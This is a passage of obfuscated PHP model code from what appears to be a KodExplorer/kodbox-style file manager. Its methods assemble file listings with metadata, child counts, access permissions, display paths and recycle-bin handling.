$ô—ü‚Ùë[78], $ô—ü‚Ùë[177] => $ô—ü‚Ùë[456], $ô—ü‚Ùë[497] => $ô—ü‚Ùë[497], $ô—ü‚Ùë[498] => $ô—ü‚Ùë[499], $ô—ü‚Ùë[217] => $ô—ü‚Ùë[217], $ô—ü‚Ùë[87] => $ô—ü‚Ùë[87]); $ı‡æóóá = Input::get($ô—ü‚Ùë[500], $ô—ü‚Ùë[7], $‹ä¸Ÿ¡™, array_keys($–“ƒëú)); $åÀº¡ê = Input::get($ô—ü‚Ùë[501], $ô—ü‚Ùë[7], $Áó»Í°à, array_keys($ÖËÒğ¾¸)); if (!in_array($ı‡æóóá, array_keys($–“ƒëú))) { $ı‡æóóá = $ô—ü‚Ùë[32]; } if (!in_array($åÀº¡ê, array_keys($ÖËÒğ¾¸))) { $ı‡æóóá = $ô—ü‚Ùë[493]; } if ($ı‡æóóá == $ô—ü‚Ùë[32]) { } $ß˜ÌÂÔú = $ô—ü‚Ùë[502] . $–“ƒëú[$ı‡æóóá] . $ô—ü‚Ùë[53] . $ÖËÒğ¾¸[$åÀº¡ê]; $ß˜ÌÂÔú = rtrim(trim($ß˜ÌÂÔú), $ô—ü‚Ùë[50]); if ($ıäşÃïş) { return array($ß˜ÌÂÔú, $ÖËÒğ¾¸[$åÀº¡ê]); } return $this->order($ß˜ÌÂÔú); } protected function _listDataApplyItem($É½Ç¤½˜, $ùäğ†Àõ = false) { $íµ¦¨óº = array($É½Ç¤½˜); $this->_listDataApply($íµ¦¨óº, $ùäğ†Àõ); return $íµ¦¨óº[0]; } protected function _listDataApply(&$§‚ßÁÚ—, $åØ¿Ìôí = false) { $õ­ø›óö =& $_SERVER[ò«¥Ê‡å]; if (!$§‚ßÁÚ—) { $§‚ßÁÚ— = array(); return; } $¢¨Åáš§ = array_to_keyvalue($§‚ßÁÚ—, $õ­ø›óö[12], $õ­ø›óö[183]); $¢¨Åáš§ = array_unique($¢¨Åáš§); $this->_listSourceCache($§‚ßÁÚ—); if (!$åØ¿Ìôí) { $this->_listAppendMeta($§‚ßÁÚ—, $¢¨Åáš§); $this->_listAppendFileMeta($§‚ßÁÚ—, $¢¨Åáš§); $this->_listAppendChildren($§‚ßÁÚ—, $¢¨Åáš§); } $this->_listAppendPath($§‚ßÁÚ—); $this->_listAppendAuth($§‚ßÁÚ—); $this->_listAppendSourceInfo($§‚ßÁÚ—, $¢¨Åáš§); $this->_listAppendUser($§‚ßÁÚ—); $this->_listFilterInfo($§‚ßÁÚ—, $åØ¿Ìôí); $this->_listAppendAuthSecret($§‚ßÁÚ—); } protected function _listSourceCache($é›€ÈÙ›) { $«×àÈÜè =& $_SERVER[ò«¥Ê‡å]; foreach ($é›€ÈÙ› as $ß²¼Ä–¯) { self::$cacheSourceInfo[$«×àÈÜè[503] . $ß²¼Ä–¯[$«×àÈÜè[183]]] = $ß²¼Ä–¯; } } protected function _listFilterInfo(&$»¦û“×”, $ãŒàñÀ¨ = false) { $°Âò¦«’ =& $_SERVER[ò«¥Ê‡å]; foreach ($»¦û“×” as &$ğ¨¸ã…Ï) { $ğ¨¸ã…Ï = $this->pathInfoFilter($ğ¨¸ã…Ï); self::$cachePathInfo[$°Âò¦«’[504] . intval($ãŒàñÀ¨) . $°Âò¦«’[432] . $ğ¨¸ã…Ï[$°Âò¦«’[183]]] = $ğ¨¸ã…Ï; } unset($ğ¨¸ã…Ï); } protected function _listMake(&$ò˜ –¶•) { $º­Úˆç =& $_SERVER[ò«¥Ê‡å]; $ò˜ –¶•[$º­Úˆç[84]] = array(); $ò˜ –¶•[$º­Úˆç[85]] = array(); foreach ($ò˜ –¶•[$º­Úˆç[415]] as $Ÿ³³®¡‚) { $è§±ªÇ = $Ÿ³³®¡‚[$º­Úˆç[455]] == 1 ? $º­Úˆç[84] : $º­Úˆç[85]; $ò˜ –¶•[$è§±ªÇ][] = $Ÿ³³®¡‚; } unset($ò˜ –¶•[$º­Úˆç[415]]); } protected function _listAppendMeta(&$˜¦ó«Ã¼, $ã×îĞÄ) { $ôµ’…¿œ =& $_SERVER[ò«¥Ê‡å]; $”´½„Äñ = array($ôµ’…¿œ[461] => array($ôµ’…¿œ[462], $ã×îĞÄ)); $¢ßòÊºæ = Model($ôµ’…¿œ[505])->field($ôµ’…¿œ[506])->where($”´½„Äñ)->select(); if (!$¢ßòÊºæ) { return; } $‹Çñ¢åû = array($ôµ’…¿œ[507], $ôµ’…¿œ[508], $ôµ’…¿œ[487]); $­Úá–¾À = array(); foreach ($¢ßòÊºæ as $®™µù“¤) { if (!isset($­Úá–¾À[$®™µù“¤[$ôµ’…¿œ[183]]])) { $­Úá–¾À[$®™µù“¤[$ôµ’…¿œ[183]]] = array(); } if (in_array($®™µù“¤[$ôµ’…¿œ[96]], $‹Çñ¢åû)) { continue; } $­Úá–¾À[$®™µù“¤[$ôµ’…¿œ[183]]][$®™µù“¤[$ôµ’…¿œ[96]]] = $®™µù“¤[$ôµ’…¿œ[420]]; } foreach ($˜¦ó«Ã¼ as &$å¯ã„şâ) { $å¯ã„şâ[$ôµ’…¿œ[509]] = !1; if (isset($­Úá–¾À[$å¯ã„şâ[$ôµ’…¿œ[183]]])) { $å¯ã„şâ[$ôµ’…¿œ[509]] = $­Úá–¾À[$å¯ã„şâ[$ôµ’…¿œ[183]]]; } if ($this->fileIsLock($å¯ã„şâ) && $å¯ã„şâ[$ôµ’…¿œ[457]]) { $©ú¤õø = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $å¯ã„şâ[$ôµ’…¿œ[457]][$ôµ’…¿œ[458]] = AuthModel::authDisable($å¯ã„şâ[$ôµ’…¿œ[457]][$ôµ’…¿œ[458]], $©ú¤õø); $å¯ã„şâ[$ôµ’…¿œ[457]][$ôµ’…¿œ[510]][$ôµ’…¿œ[457]] = $å¯ã„şâ[$ôµ’…¿œ[457]][$ôµ’…¿œ[458]]; } } unset($å¯ã„şâ); } protected function _listAppendFileMeta(&$ùÍœíàş, $ˆ ÇàÀ‰) { $ĞßúŞğ =& $_SERVER[ò«¥Ê‡å]; $ØşÎöä¡ = array_to_keyvalue($ùÍœíàş, $ĞßúŞğ[12], $ĞßúŞğ[511]); $ØşÎöä¡ = array_filter(array_unique($ØşÎöä¡)); if (!$ØşÎöä¡) { return; } $¯áöçùŠ = array($ĞßúŞğ[512] => array($ĞßúŞğ[462], $ØşÎöä¡)); $£Õ™Åª’ = $ĞßúŞğ[513]; $÷…®»¿¿ = Model($ĞßúŞğ[514])->field($£Õ™Åª’)->where($¯áöçùŠ)->select(); $÷…®»¿¿ = array_to_keyvalue($÷…®»¿¿, $ĞßúŞğ[511]); $™Èòù° = Model($ĞßúŞğ[515])->field($ĞßúŞğ[516])->where($¯áöçùŠ)->select(); $™Èòù° = $™Èòù° ? $™Èòù° : array(); $Ü‘ëÄÚ = array(); foreach ($™Èòù° as $şòù½¬Î) { if (!isset($Ü‘ëÄÚ[$şòù½¬Î[$ĞßúŞğ[511]]])) { $Ü‘ëÄÚ[$şòù½¬Î[$ĞßúŞğ[511]]] = array(); } $Ü‘ëÄÚ[$şòù½¬Î[$ĞßúŞğ[511]]][$şòù½¬Î[$ĞßúŞğ[96]]] = $şòù½¬Î[$ĞßúŞğ[420]]; } foreach ($ùÍœíàş as &$¡×ŠÁåü) { $ âØÍòû = $¡×ŠÁåü[$ĞßúŞğ[511]]; if (!$ âØÍòû || !is_array($÷…®»¿¿[$ âØÍòû])) { continue; } $ïÇ°ì  = $÷…®»¿¿[$ âØÍòû]; $ïÇ°ì [$ĞßúŞğ[78]] = $¡×ŠÁåü[$ĞßúŞğ[78]]; $ïÇ°ì [$ĞßúŞğ[32]] = $¡×ŠÁåü[$ĞßúŞğ[32]]; if (!$ïÇ°ì [$ĞßúŞğ[517]]) { Model($ĞßúŞğ[514])->fileMd5Check($ïÇ°ì ); } if (!isset(self::$cacheFileInfo[$ĞßúŞğ[518] . $ âØÍòû])) { self::$cacheFileInfo[$ĞßúŞğ[518] . $ âØÍòû] = array_merge(array(), $ïÇ°ì ); } unset($÷…®»¿¿[$ âØÍòû][$ĞßúŞğ[86]]); $ÄûÛ¾œ° = is_array($Ü‘ëÄÚ[$ âØÍòû]) ? $Ü‘ëÄÚ[$ âØÍòû] : array(); $¡×ŠÁåü[$ĞßúŞğ[519]] = array_merge($ÄûÛ¾œ°, $÷…®»¿¿[$ âØÍòû]); if (isset($¡×ŠÁåü[$ĞßúŞğ[519]][$ĞßúŞğ[173]])) { $¡×ŠÁåü[$ĞßúŞğ[173]] = json_decode($¡×ŠÁåü[$ĞßúŞğ[519]][$ĞßúŞğ[173]], !0); unset($¡×ŠÁåü[$ĞßúŞğ[519]][$ĞßúŞğ[173]]); } } unset($¡×ŠÁåü); } protected function _listAppendSourceInfo(&$£ü¶«, $Í†œ©’¢) { $ÚØ®¶‡® =& $_SERVER[ò«¥Ê‡å]; $ÖÊ°ìî• = Model($ÚØ®¶‡®[520])->listData(); $áâËÏÒ = Model($ÚØ®¶‡®[469])->listData(); $¼øšÜØÚ = Model($ÚØ®¶‡®[459])->listData(); $ºƒÌÃê = Model($ÚØ®¶‡®[521])->listSimple(); $œ¦ë“— = array_to_keyvalue($ÖÊ°ìî•, $ÚØ®¶‡®[445]); $§¥¶ŞƒÜ = array_to_keyvalue_group($áâËÏÒ, $ÚØ®¶‡®[86], $ÚØ®¶‡®[470]); $š‡ÅÂº° = array_to_keyvalue($¼øšÜØÚ, $ÚØ®¶‡®[86]); $Úé‰ù†ı = array_to_keyvalue_group($ºƒÌÃê, $ÚØ®¶‡®[183]); foreach ($£ü¶« as &$ş¯«˜¯ò) { $ş¯«˜¯ò[$ÚØ®¶‡®[89]] = array($ÚØ®¶‡®[522] => 0, $ÚØ®¶‡®[523] => 0, $ÚØ®¶‡®[524] => 0); if (isset($š‡ÅÂº°[$ş¯«˜¯ò[$ÚØ®¶‡®[183]]])) { $ş¯«˜¯ò[$ÚØ®¶‡®[89]][$ÚØ®¶‡®[525]] = 1; $ş¯«˜¯ò[$ÚØ®¶‡®[89]][$ÚØ®¶‡®[526]] = $š‡ÅÂº°[$ş¯«˜¯ò[$ÚØ®¶‡®[183]]][$ÚØ®¶‡®[32]]; } if ($§¥¶ŞƒÜ && $œ¦ë“— && isset($§¥¶ŞƒÜ[$ş¯«˜¯ò[$ÚØ®¶‡®[183]]])) { $ş¯«˜¯ò[$ÚØ®¶‡®[89]][$ÚØ®¶‡®[527]] = array(); foreach ($§¥¶ŞƒÜ[$ş¯«˜¯ò[$ÚØ®¶‡®[183]]] as $÷¯¢ÏÊü) { $õÔÙ¾Ğ÷ = $œ¦ë“—[$÷¯¢ÏÊü]; $ş¯«˜¯ò[$ÚØ®¶‡®[89]][$ÚØ®¶‡®[527]][] = array($ÚØ®¶‡®[528] => $õÔÙ¾Ğ÷[$ÚØ®¶‡®[445]], $ÚØ®¶‡®[464] => $õÔÙ¾Ğ÷[$ÚØ®¶‡®[32]], $ÚØ®¶‡®[529] => $õÔÙ¾Ğ÷[$ÚØ®¶‡®[530]]); } } if ($Úé‰ù†ı && isset($Úé‰ù†ı[$ş¯«˜¯ò[$ÚØ®¶‡®[183]]])) { $ş¯«˜¯ò[$ÚØ®¶‡®[89]][$ÚØ®¶‡®[531]] = array(); foreach ($Úé‰ù†ı[$ş¯«˜¯ò[$ÚØ®¶‡®[183]]] as $È¨ûğ¥‚) { $Óš°Ÿ = $ÚØ®¶‡®[532]; if ($È¨ûğ¥‚[$ÚØ®¶‡®[533]] == $ÚØ®¶‡®[90]) { $Óš°Ÿ .= $ÚØ®¶‡®[534]; } $ş¯«˜¯ò[$ÚØ®¶‡®[89]][$ÚØ®¶‡®[531]] = array_field_key($È¨ûğ¥‚, explode($ÚØ®¶‡®[50], $Óš°Ÿ)); } } } unset($ş¯«˜¯ò); return $£ü¶«; } protected function _listAppendChildren(&$Ûû’­´Ò, $î¸¬Ì‚•) { $Ğ±øÄğĞ =& $_SERVER[ò«¥Ê‡å]; $Ñ®œ‘Ãˆ = array(); $²–’÷ÄÊ = array($Ğ±øÄğĞ[225] => 0, $Ğ±øÄğĞ[226] => 0); foreach ($Ûû’­´Ò as &$¢ÂÈóšÅ) { if (!$¢ÂÈóšÅ[$Ğ±øÄğĞ[455]]) { continue; } $Ñ®œ‘Ãˆ[] = $¢ÂÈóšÅ[$Ğ±øÄğĞ[183]]; } unset($¢ÂÈóšÅ); if (!$Ñ®œ‘Ãˆ) { return; } $»šˆ´ê» = array($Ğ±øÄğĞ[182] => array($Ğ±øÄğĞ[7], $Ñ®œ‘Ãˆ), $Ğ±øÄğĞ[475] => 0); $æêã¦Ê = array($Ğ±øÄğĞ[182], $Ğ±øÄğĞ[455], $Ğ±øÄğĞ[535] => $Ğ±øÄğĞ[536]); $îïË‹Á = $this->field($æêã¦Ê)->where($»šˆ´ê»)->group($Ğ±øÄğĞ[537])->select(); $èæ”‡ñ÷ = array(); foreach ($îïË‹Á as $ğÇøœŸ) { $åÑ•®¹ = $ğÇøœŸ[$Ğ±øÄğĞ[182]]; $Á¢ÑÜ¿Ô = $ğÇøœŸ[$Ğ±øÄğĞ[455]] == $Ğ±øÄğĞ[90] ? $Ğ±øÄğĞ[226] : $Ğ±øÄğĞ[225]; if (!isset($èæ”‡ñ÷[$åÑ•®¹])) { $èæ”‡ñ÷[$åÑ•®¹] = array($Ğ±øÄğĞ[225] => 0, $Ğ±øÄğĞ[226] => 0); } $èæ”‡ñ÷[$åÑ•®¹][$Á¢ÑÜ¿Ô] += $ğÇøœŸ[$Ğ±øÄğĞ[536]]; } foreach ($Ûû’­´Ò as &$¢ÂÈóšÅ) { if (!$¢ÂÈóšÅ[$Ğ±øÄğĞ[455]]) { continue; } $ÆœÒ§Ú = is_array($èæ”‡ñ÷[$¢ÂÈóšÅ[$Ğ±øÄğĞ[183]]]) ? $èæ”‡ñ÷[$¢ÂÈóšÅ[$Ğ±øÄğĞ[183]]] : $²–’÷ÄÊ; $¢ÂÈóšÅ[$Ğ±øÄğĞ[226]] = $ÆœÒ§Ú[$Ğ±øÄğĞ[226]]; $¢ÂÈóšÅ[$Ğ±øÄğĞ[225]] = $ÆœÒ§Ú[$Ğ±øÄğĞ[225]]; unset($¢ÂÈóšÅ[$Ğ±øÄğĞ[456]]); } unset($¢ÂÈóšÅ); } protected function _listAppendAuth(&$¿‚¬°Ö) { $†¶ù÷ =& $_SERVER[ò«¥Ê‡å]; $öˆû€Å = array(); foreach ($¿‚¬°Ö as $¦ÃË½ô) { if ($¦ÃË½ô[$†¶ù÷[180]] == self::TYPE_GROUP) { $öˆû€Å[] = $¦ÃË½ô[$†¶ù÷[183]]; } } if (!$öˆû€Å) { return; } $Ç¦º‘²Ö = array_to_keyvalue($¿‚¬°Ö, $†¶ù÷[183]); $¡ãØêƒ = Model($†¶ù÷[538])->getSourceList($öˆû€Å, $Ç¦º‘²Ö); $ÒäãÎëŒ = KodUser::isRoot(); foreach ($¿‚¬°Ö as $õãµë¶ë => &$¦ÃË½ô) { $¦ÃË½ô[$†¶ù÷[457]] = $¡ãØêƒ[$¦ÃË½ô[$†¶ù÷[183]]]; if (!$¦ÃË½ô[$†¶ù÷[457]] && $¦ÃË½ô[$†¶ù÷[180]] == self::TYPE_GROUP) { $¦ÃË½ô[$†¶ù÷[457]] = Action($†¶ù÷[539])->pathGroupAuthMake($¦ÃË½ô[$†¶ù÷[540]]); if (!$¦ÃË½ô[$†¶ù÷[457]] && !$ÒäãÎëŒ) { $¦ÃË½ô[$†¶ù÷[219]] = !1; $¦ÃË½ô[$†¶ù÷[218]] = !1; } } if ($¦ÃË½ô[$†¶ù÷[457]]) { $¦ÃË½ô[$†¶ù÷[219]] = AuthModel::authCheckEdit($¦ÃË½ô[$†¶ù÷[457]][$†¶ù÷[458]]); $¦ÃË½ô[$†¶ù÷[218]] = AuthModel::authCheckView($¦ÃË½ô[$†¶ù÷[457]][$†¶ù÷[458]]); } $this->groupPathDisplay($¦ÃË½ô); } unset($¦ÃË½ô); } public function _listAppendAuthSecret(&$¥ï†“ùÎ) { $À„Şî„ =& $_SERVER[ò«¥Ê‡å]; if (Model($À„Şî„[478])->get($À„Şî„[541]) != $À„Şî„[90]) { return; } static $Ñäø­¶õ = false; if (!$Ñäø­¶õ) { $ß²Ÿêƒ = Model($À„Şî„[542]); $“óòİÛø = Model($À„Şî„[543]); $Ñäø­¶õ = $“óòİÛø->listData(); $Ñäø­¶õ = array_to_keyvalue($Ñäø­¶õ, $À„Şî„[183]); $¤Ğà”¤„ = json_decode(Model($À„Şî„[478])->get($À„Şî„[544]), !0); $¤Ğà”¤„ = array_to_keyvalue($¤Ğà”¤„, $À„Şî„[445]); foreach ($Ñäø­¶õ as $§­ª´§ => $ÉªŠøÍà) { $ÖÌîçêä = $¤Ğà”¤„[$ÉªŠøÍà[$À„Şî„[545]]]; if (!$ÖÌîçêä) { $“óòİÛø->remove($ÉªŠøÍà[$À„Şî„[445]]); unset($Ñäø­¶õ[$§­ª´§]); continue; } $àšæ²ãŒ = $ß²Ÿêƒ->listData($ÖÌîçêä[$À„Şî„[457]]); if (!$àšæ²ãŒ) { $“óòİÛø->remove($ÉªŠøÍà[$À„Şî„[445]]); unset($Ñäø­¶õ[$§­ª´§]); continue; } $ÉªŠøÍà[$À„Şî„[457]] = $àšæ²ãŒ; $ÉªŠøÍà[$À„Şî„[546]] = $ÖÌîçêä; $ÉªŠøÍà[$À„Şî„[547]] = Model($À„Şî„[548])->getInfoSimpleOuter($ÉªŠøÍà[$À„Şî„[497]]); $Ñäø­¶õ[$§­ª´§] = $ÉªŠøÍà; } } $¢ö‡«œÄ = USER_ID; $Ó†ô¤û = array(); $íœ‘‘Ø = $this->_listAppendPath($Ó†ô¤û, !0); foreach ($¥ï†“ùÎ as $§­ª´§ => &$ÉªŠøÍà) { if (!is_array($ÉªŠøÍà[$À„Şî„[457]])) { continue; } if ($ÉªŠøÍà[$À„Şî„[180]] != $À„Şî„[549]) { continue; } if (isset($Ñäø­¶õ[$ÉªŠøÍà[$À„Şî„[183]]])) { $à“Û† = $Ñäø­¶õ[$ÉªŠøÍà[$À„Şî„[183]]]; if (!is_array($ÉªŠøÍà[$À„Şî„[509]])) { $ÉªŠøÍà[$À„Şî„[509]] = array(); } $ÉªŠøÍà[$À„Şî„[509]][$À„Şî„[550]] = $à“Û†[$À„Şî„[545]]; $ÉªŠøÍà[$À„Şî„[457]][$À„Şî„[551]] = $à“Û†; $ÉªŠøÍà[$À„Şî„[457]][$À„Şî„[552]] = $ÉªŠøÍà[$À„Şî„[553]]; $ÉªŠøÍà[$À„Şî„[457]][$À„Şî„[554]] = $À„Şî„[90]; if ($à“Û†[$À„Şî„[497]] != $¢ö‡«œÄ) { $ÉªŠøÍà[$À„Şî„[457]][$À„Şî„[458]] = $ÉªŠøÍà[$À„Şî„[457]][$À„Şî„[458]] & $à“Û†[$À„Şî„[457]][$À„Şî„[457]]; } continue; } $ŒºëÌö = $this->parentLevelArray($ÉªŠøÍà[$À„Şî„[555]]); $ò¾ìÙ½¸ = array_reverse($ŒºëÌö); foreach ($ò¾ìÙ½¸ as $¬¥«ŞÒ‰ => $¥å”ø’ª) { if (!isset($Ñäø­¶õ[$¥å”ø’ª])) { continue; } $à“Û† = $Ñäø­¶õ[$¥å”ø’ª]; $ÉªŠøÍà[$À„Şî„[457]][$À„Şî„[551]] = $à“Û†; if ($à“Û†[$À„Şî„[497]] != $¢ö‡«œÄ) { $ÉªŠøÍà[$À„Şî„[457]][$À„Şî„[458]] = $ÉªŠøÍà[$À„Şî„[457]][$À„Şî„[458]] & $à“Û†[$À„Şî„[457]][$À„Şî„[457]]; } $Èø®Œà± = $À„Şî„[12]; $ìóµñäÛ = count($ŒºëÌö) - $¬¥«ŞÒ‰; for ($‹Â¿ğĞˆ = 0; $‹Â¿ğĞˆ < $ìóµñäÛ; $‹Â¿ğĞˆ++) { if (!isset($íœ‘‘Ø[$ŒºëÌö[$‹Â¿ğĞˆ]])) { $Èø®Œà± = $À„Şî„[12]; break; } $Èø®Œà± = $Èø®Œà± . rtrim($íœ‘‘Ø[$ŒºëÌö[$‹Â¿ğĞˆ]], $À„Şî„[8]) . $À„Şî„[8]; } $ÉªŠøÍà[$À„Şî„[457]][$À„Şî„[552]] = rtrim($Èø®Œà±, $À„Şî„[8]) . $À„Şî„[8]; break; } } unset($ÉªŠøÍà); } public function groupPathDisplay(&$·¾™½‚ä) { $ƒÉ°øşŞ =& $_SERVER[ò«¥Ê‡å]; if ($·¾™½‚ä[$ƒÉ°øşŞ[180]] != self::TYPE_GROUP) { return; } $úÄÙçˆş = Model($ƒÉ°øşŞ[556])->getInfo($·¾™½‚ä[$ƒÉ°øşŞ[540]]); $óÉ÷ó¥ê = $this->parentLevelArray($úÄÙçˆş[$ƒÉ°øşŞ[555]]); $Åª”œÛ = $ƒÉ°øşŞ[12]; foreach ($óÉ÷ó¥ê as $±ïœ‘î…) { $ƒ™É•‰¼ = Model($ƒÉ°øşŞ[556])->getInfo($±ïœ‘î…); $Åª”œÛ .= $ƒ™É•‰¼[$ƒÉ°øşŞ[89]][$ƒÉ°øşŞ[183]] . $ƒÉ°øşŞ[50]; } $·¾™½‚ä[$ƒÉ°øşŞ[557]] = $úÄÙçˆş[$ƒÉ°øşŞ[182]]; $·¾™½‚ä[$ƒÉ°øşŞ[558]] = $úÄÙçˆş[$ƒÉ°øşŞ[555]]; $·¾™½‚ä[$ƒÉ°øşŞ[559]] = $úÄÙçˆş[$ƒÉ°øşŞ[560]]; $·¾™½‚ä[$ƒÉ°øşŞ[561]] = $Åª”œÛ . $úÄÙçˆş[$ƒÉ°øşŞ[89]][$ƒÉ°øşŞ[183]]; } protected function _listAppendPath(&$Ú¹ÌéÇÑ, $Ä˜åÓ°ß = false) { $Ô¬¥ÖñÅ =& $_SERVER[ò«¥Ê‡å]; static $‡¨õ–¼‰ = array(); $å âñé¼ = array(); $»Ÿ“õ¢ = array(); if ($Ä˜åÓ°ß) { return $‡¨õ–¼‰; } foreach ($Ú¹ÌéÇÑ as &$øê‘ğÄ) { $¹Ÿ²À  = $øê‘ğÄ[$Ô¬¥ÖñÅ[183]]; if ($øê‘ğÄ[$Ô¬¥ÖñÅ[455]] == $Ô¬¥ÖñÅ[90] && $øê‘ğÄ[$Ô¬¥ÖñÅ[182]] != 0) { $‡¨õ–¼‰[$¹Ÿ²À ] = $øê‘ğÄ[$Ô¬¥ÖñÅ[32]]; } if ($øê‘ğÄ[$Ô¬¥ÖñÅ[455]] == $Ô¬¥ÖñÅ[90] && $øê‘ğÄ[$Ô¬¥ÖñÅ[182]] == 0) { $‡¨õ–¼‰[$¹Ÿ²À ] = $this->_listAppendPathRoot($øê‘ğÄ, array()); } if (isset($»Ÿ“õ¢[$øê‘ğÄ[$Ô¬¥ÖñÅ[555]]])) { continue; } $»Ÿ“õ¢[$øê‘ğÄ[$Ô¬¥ÖñÅ[555]]] = !0; $šÔºˆô” = $this->parentLevelArray($øê‘ğÄ[$Ô¬¥ÖñÅ[555]]); foreach ($šÔºˆô” as $¶ŸÛˆŠî => $øşÑ‘÷) { if (isset($‡¨õ–¼‰[$øşÑ‘÷])) { continue; } if ($¶ŸÛˆŠî == 0) { $‡¨õ–¼‰[$øşÑ‘÷] = $this->_listAppendPathRoot($øê‘ğÄ, $šÔºˆô”); } if ($¶ŸÛˆŠî != 0) { $å âñé¼[] = $øşÑ‘÷; } } } unset($øê‘ğÄ); $å âñé¼ = array_unique($å âñé¼); if (count($å âñé¼) > 0) { $ÓêË€Š¯ = array($Ô¬¥ÖñÅ[461] => array($Ô¬¥ÖñÅ[462], $å âñé¼)); if (count($å âñé¼) == 1) { $²ºÔ¡©¦ = $this->sourceInfo($å âñé¼[0]); $Í—Èğ‡ = is_array($²ºÔ¡©¦) ? array($²ºÔ¡©¦) : !1; } else { $Í—Èğ‡ = $this->field($Ô¬¥ÖñÅ[562])->where($ÓêË€Š¯)->select(); } if (!$Í—Èğ‡) { $Í—Èğ‡ = array(); } foreach ($Í—Èğ‡ as $Ÿ×¨¹î®) { $‡¨õ–¼‰[$Ÿ×¨¹î®[$Ô¬¥ÖñÅ[183]]] = $Ÿ×¨¹î®[$Ô¬¥ÖñÅ[32]]; } } $ûµ²ä…• = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Ê ñÚìŸ = array(); foreach ($Ú¹ÌéÇÑ as &$øê‘ğÄ) { $°Ñ’×¶ü = $øê‘ğÄ[$Ô¬¥ÖñÅ[555]]; $­²‰ßüÍ = $Ô¬¥ÖñÅ[12]; if (isset($Ê ñÚìŸ[$°Ñ’×¶ü])) { $­²‰ßüÍ = $Ê ñÚìŸ[$°Ñ’×¶ü]; } else { $šÔºˆô” = $this->parentLevelArray($øê‘ğÄ[$Ô¬¥ÖñÅ[555]]); foreach ($šÔºˆô” as $¶ŸÛˆŠî => $øşÑ‘÷) { if (isset($‡¨õ–¼‰[$øşÑ‘÷])) { $­²‰ßüÍ .= $‡¨õ–¼‰[$øşÑ‘÷] . $Ô¬¥ÖñÅ[8]; } } $Ê ñÚìŸ[$°Ñ’×¶ü] = $­²‰ßüÍ; } $­²‰ßüÍ .= $øê‘ğÄ[$Ô¬¥ÖñÅ[32]]; if ($øê‘ğÄ[$Ô¬¥ÖñÅ[455]] == $Ô¬¥ÖñÅ[90]) { $­²‰ßüÍ .= $Ô¬¥ÖñÅ[8]; } $øê‘ğÄ[$Ô¬¥ÖñÅ[553]] = str_replace($Ô¬¥ÖñÅ[563], $Ô¬¥ÖñÅ[8], $­²‰ßüÍ); if ($øê‘ğÄ[$Ô¬¥ÖñÅ[182]] == $Ô¬¥ÖñÅ[214]) { $øê‘ğÄ[$Ô¬¥ÖñÅ[32]] = trim($‡¨õ–¼‰[$øê‘ğÄ[$Ô¬¥ÖñÅ[183]]], $Ô¬¥ÖñÅ[8]); $øê‘ğÄ[$Ô¬¥ÖñÅ[553]] = $øê‘ğÄ[$Ô¬¥ÖñÅ[32]] . $Ô¬¥ÖñÅ[8]; } if (intval($øê‘ğÄ[$Ô¬¥ÖñÅ[180]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($øê‘ğÄ, $šÔºˆô”, $ûµ²ä…•); } } unset($øê‘ğÄ); return $Ú¹ÌéÇÑ; } private function _listAppendPathRecycle(&$æø™ˆĞê, $’áëğçÖ, $œÚ™‘Æ) { $ı©îÑ =& $_SERVER[ò«¥Ê‡å]; if (!in_array($œÚ™‘Æ, $’áëğçÖ) && $æø™ˆĞê[$ı©îÑ[183]] != $œÚ™‘Æ) { return; } $ğÖÅÊŸ = explode($ı©îÑ[8], trim($æø™ˆĞê[$ı©îÑ[553]], $ı©îÑ[8])); $Àƒ«Ó = implode($ı©îÑ[8], array_slice($ğÖÅÊŸ, 2)); $æø™ˆĞê[$ı©îÑ[553]] = $ı©îÑ[8] . LNG($ı©îÑ[564]) . $ı©îÑ[8] . ltrim($Àƒ«Ó, $ı©îÑ[8]); $æø™ˆĞê[$ı©îÑ[555]] = $ı©îÑ[565] . implode($ı©îÑ[50], array_slice($’áëğçÖ, 1)) . $ı©îÑ[50]; if ($æø™ˆĞê[$ı©îÑ[183]] == $œÚ™‘Æ) { $æø™ˆĞê[$ı©îÑ[555]] = $ı©îÑ[565]; $æø™ˆĞê[$ı©îÑ[182]] = $ı©îÑ[214]; $æø™ˆĞê[$ı©îÑ[32]] = LNG($ı©îÑ[564]); } $æø™ˆĞê[$ı©îÑ[566]] = $ı©îÑ[567]; } protected function _listAppendPathRoot(&$çËæò¨ƒ, $Ñãû¸±—) { $È±Í¾éä =& $_SERVER[ò«¥Ê‡å]; static $šªÏ°·ƒ = false; $ŸîÈÄÏ” = $È±Í¾éä[12]; if ($çËæò¨ƒ[$È±Í¾éä[180]] == self::TYPE_USER) { if ($çËæò¨ƒ[$È±Í¾éä[540]] == USER_ID) { $ŸîÈÄÏ” = LNG($È±Í¾éä[568]); if ($šªÏ°·ƒ === !1) { $í«ØÔË = Model($È±Í¾éä[569])->getInfoFull(USER_ID); $šªÏ°·ƒ = _get($í«ØÔË, $È±Í¾éä[570], $È±Í¾éä[12]); } if ($Ñãû¸±— && $Ñãû¸±—[0] == $šªÏ°·ƒ || !$Ñãû¸±— && $çËæò¨ƒ[$È±Í¾éä[183]] == $šªÏ°·ƒ) { $ŸîÈÄÏ” = LNG($È±Í¾éä[571]); $çËæò¨ƒ[$È±Í¾éä[572]] = $È±Í¾éä[573]; } if (!$Ñãû¸±—) { $çËæò¨ƒ[$È±Í¾éä[32]] = $ŸîÈÄÏ”; } } else { $çËæò¨ƒ[$È±Í¾éä[574]] = Model($È±Í¾éä[548])->getInfoSimpleOuter($çËæò¨ƒ[$È±Í¾éä[540]]); $ŸîÈÄÏ” = LNG($È±Í¾éä[575]) . $È±Í¾éä[165] . $çËæò¨ƒ[$È±Í¾éä[574]][$È±Í¾éä[32]] . $È±Í¾éä[167]; } } else { if ($çËæò¨ƒ[$È±Í¾éä[180]] == self::TYPE_GROUP) { $Š¯¶ˆ™´ = Model($È±Í¾éä[556])->getInfoSimple($çËæò¨ƒ[$È±Í¾éä[540]]); $ŸîÈÄÏ” = $Š¯¶ˆ™´[$È±Í¾éä[32]]; } else { if ($çËæò¨ƒ[$È±Í¾éä[180]] == self::TYPE_SYSTEM) { $ŸîÈÄÏ” = $È±Í¾éä[576]; } } } $ŸîÈÄÏ” = $ŸîÈÄÏ” ? $È±Í¾éä[8] . $ŸîÈÄÏ” . $È±Í¾éä[8] : $È±Í¾éä[8]; return $ŸîÈÄÏ”; } protected function _listAppendUser(&$óÕêò) { $ú©Òåƒ =& $_SERVER[ò«¥Ê‡å]; 